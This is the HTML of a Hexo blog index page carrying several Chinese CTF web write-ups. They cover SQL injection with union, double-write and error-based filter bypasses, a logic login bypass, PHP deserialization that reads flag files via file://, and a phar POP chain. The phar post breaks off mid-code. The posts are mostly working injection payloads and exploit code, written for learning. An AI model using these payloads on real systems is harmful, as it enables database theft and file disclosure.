<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 5.4.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/SSRF/" style="font-size: 11.67px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-union绕过(反序列化)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/28/union%E7%BB%95%E8%BF%87(%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/" class="article-date">
  	<time datetime="2021-08-27T16:00:00.000Z" itemprop="datePublished">2021-08-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/28/union%E7%BB%95%E8%BF%87(%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/">
        union绕过(反序列化)
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="union绕过-反序列化）"><a href="#union绕过-反序列化）" class="headerlink" title="union绕过(反序列化）"></a>union绕过(反序列化）</h1><p>通过看到/view.php?no=1，可以猜测可能是一个注入点，因此构造常见闭合点，可知数字型注入<br>通过构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,2,3,4%23</span><br></pre></td></tr></table></figure>
<p>返回的信息可知，union被过滤点，因此可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”union“相当于”/*!union*/“</span><br></pre></td></tr></table></figure>
<p>进行绕过，而后进行联合注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">-1 /*!union*/ select 1,database(),3,4%23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,database(),3,4 limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据表</span><br><span class="line">-1 /*!union*/ select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27; %23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27; limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据列</span><br><span class="line">-1 /*!union*/ select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27; limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据列中字段的内容</span><br><span class="line">-1 /*!union*/ select 1,group_concat(no,&quot;----&quot;,username,&quot;----&quot;,passwd,&quot;----&quot;,data),3,4 from fakebook.users %23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,group_concat(no,&quot;----&quot;,username,&quot;----&quot;,passwd,&quot;----&quot;,data),3,4 from fakebook.users limit 1 offset 0%23</span><br></pre></td></tr></table></figure>
<p>而后看到出现no、username、passwd、data字段的内容，可以看到data字段是序列化的内容，因此我们可以试一下robots.txt来读取源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以用file://协议来读取flag文件，猜测文件在/var/www/html/目录下，因此可以构造exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new UserInfo();</span><br><span class="line">$a-&gt;name=admin;</span><br><span class="line">$a-&gt;age=12;</span><br><span class="line">$a-&gt;blog=file://var/www/html/flag.php</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>而后构造payload，来控制检索的data数据，即可读出flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 /*!union*/ select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-双写绕过(联合注入)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/27/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/" class="article-date">
  	<time datetime="2021-08-26T16:00:00.000Z" itemprop="datePublished">2021-08-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/27/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/">
        双写绕过(联合注入)
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h1><p>通过在username和password中构造可疑闭合点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username：admin&#x27;、admin&quot;、admin&quot;)、admin&#x27;)</span><br><span class="line"></span><br><span class="line">password：admin&#x27;、admin&quot;、admin&quot;)、admin&#x27;)</span><br></pre></td></tr></table></figure>
<p>发现注入点在password，且闭合是单引号，我们可以通过双写绕过的方式来进行联合注入</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">admin&#x27; ununionion seleselectct group_concat(schema_name),group_concat(schema_name),group_concat(schema_name) frfromom infoorrmation_schema.schemata limit 1 offset 0--+</span><br><span class="line"></span><br><span class="line">报数据表</span><br><span class="line">admin&#x27; ununionion seleselectct group_concat(table_name),group_concat(table_name),group_concat(table_name) frfromom infoorrmation_schema.tables limit 1 offset 0%23</span><br><span class="line">admin&#x27; ununionion seleselectct table_name,table_name,table_name frfromom infoorrmation_schema.tables limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">报数据列</span><br><span class="line">admin&#x27; ununionion seleselectct column_name,column_name,column_name frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;Flag&#x27; limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据列中的内容</span><br><span class="line">admin&#x27; ununionion seleselectct flag,flag,flag frfromom ctf.Flag limit 1 offset 0%23</span><br></pre></td></tr></table></figure>
<p>其中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit 1 offset 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>的解析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select * from table limit 2,1;</span><br><span class="line">//跳过2条取出1条数据，limit后面是从第2条开始读，读取1条信息，即读取第3条数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from table limit 2 offset 1;</span><br><span class="line">//从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-报错注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/27/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
  	<time datetime="2021-08-26T16:00:00.000Z" itemprop="datePublished">2021-08-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/27/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
        报错注入(=和空格的过滤)
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="报错注入之等于号和空格的过滤"><a href="#报错注入之等于号和空格的过滤" class="headerlink" title="报错注入之等于号和空格的过滤"></a>报错注入之等于号和空格的过滤</h1><p>等于号和空格的过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;=&quot;相当于&quot;like&quot;</span><br><span class="line"></span><br><span class="line">&quot;空格&quot;相当于&quot;()&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>闭合点为单引号闭合，因此可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(database()))))%23</span><br><span class="line"></span><br><span class="line">爆数据表</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%23</span><br><span class="line"></span><br><span class="line">爆数据列</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;))))%23</span><br><span class="line"></span><br><span class="line">爆数据列中的内容</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23</span><br><span class="line"></span><br><span class="line">左边内容</span><br><span class="line">aaa&#x27;^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))%23</span><br><span class="line"></span><br><span class="line">右边内容</span><br><span class="line">aaa&#x27;^extractvalue(1,left(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))%23</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-逻辑sql注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/27/%E9%80%BB%E8%BE%91sql%E6%B3%A8%E5%85%A5/" class="article-date">
  	<time datetime="2021-08-26T16:00:00.000Z" itemprop="datePublished">2021-08-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/27/%E9%80%BB%E8%BE%91sql%E6%B3%A8%E5%85%A5/">
        逻辑sql注入
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="逻辑sql注入"><a href="#逻辑sql注入" class="headerlink" title="逻辑sql注入"></a>逻辑sql注入</h1><p>关键词判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">联合注入：unin被过滤</span><br><span class="line">报错注入：and、or、updatexml被过滤</span><br><span class="line">bool注入和time注入：and、or被过滤</span><br></pre></td></tr></table></figure>

<p>打开页面源码，看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br></pre></td></tr></table></figure>
<p>由于base32的特征是纯大写+数字，所以进行base32解密，得到有等于号的字母加数字，猜测是base64，进行base64解密，得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>
<p>可见在username中有注入点，由于=和or被过滤，所以可以使用&lt;&gt;或like来代替=，用0r来代替or，不过也报错</p>
<p>因此，我们可以从后端逻辑出发，一般是：先检索数据。拿出username的键值来进行对比，如果错误，则报错，如果正确，则进行下一步，再拿password的键值与我们输入的password进行比较</p>
<p>不过放在数据库里用于比较的键值都是加密的，加密方式有mysql、mysql5、md5等，我们可以猜想它的工作的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$data = 检索数据。</span><br><span class="line">if ($data[&#x27;username&#x27;] === &#x27;admin&#x27;) &#123;</span><br><span class="line">	if ($data[&#x27;password&#x27;] === md5($pw)) &#123;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因此我们可以使用联合注入来操纵检索数据，一般数据列中的字段都是id,username,password，所以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1,admin,输入密码的md5值%23&amp;pw=输入密码</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-phar反序列化" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  	<time datetime="2021-08-21T16:00:00.000Z" itemprop="datePublished">2021-08-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
        phar反序列化
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="phar反序列化（吃瓜杯attup"><a href="#phar反序列化（吃瓜杯attup" class="headerlink" title="phar反序列化（吃瓜杯attup)"></a>phar反序列化（吃瓜杯attup)</h1><p>打开页面，可知只能是zip、rar、tar文件可以上传，因此我们随意构造一个zip文件上传<br>然后查询上传的zip文件，之后打开页面源码，发现有一处源码泄露</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class View &#123;</span><br><span class="line">    public $fn;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($this-&gt;fn));</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $fun = &quot;:)&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $fuc = $this-&gt;fun;</span><br><span class="line">        $fuc();</span><br><span class="line">        return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_POST[&quot;file&quot;];</span><br><span class="line">$stat = @stat($filename);</span><br></pre></td></tr></table></figure>
<p>其中stat()这个函数用的很少, 用于返回关于文件的信息, 但是它也可以触发 phar 文件, 这里主要是考察了通过 zip 或 tar 文件包装的phar文件进行触发<br>phar反序列化详细请看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p>
<p>因此我们可以构造pop链并压缩成zip文件或tar文件并包装成phar文件的格式上传，phar文件可以绕过&lt;?和php的过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">zip</span><br><span class="line"></span><br><span class="line">class View &#123;</span><br><span class="line">    public $fn;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($this-&gt;fn));</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $fun = &quot;:)&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $fuc = $this-&gt;fun;</span><br><span class="line">        $fuc();</span><br><span class="line">        return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new View();</span><br><span class="line">$a-&gt;fn = &#x27;/flag&#x27;;</span><br><span class="line">$b = new Fun();</span><br><span class="line">$b-&gt;fun = $a;</span><br><span class="line">$c = new Fun();</span><br><span class="line">$c-&gt;fun = $b;</span><br><span class="line">$d = serialize($c);</span><br><span class="line">if(file_exists(&#x27;phar.zip&#x27;)) 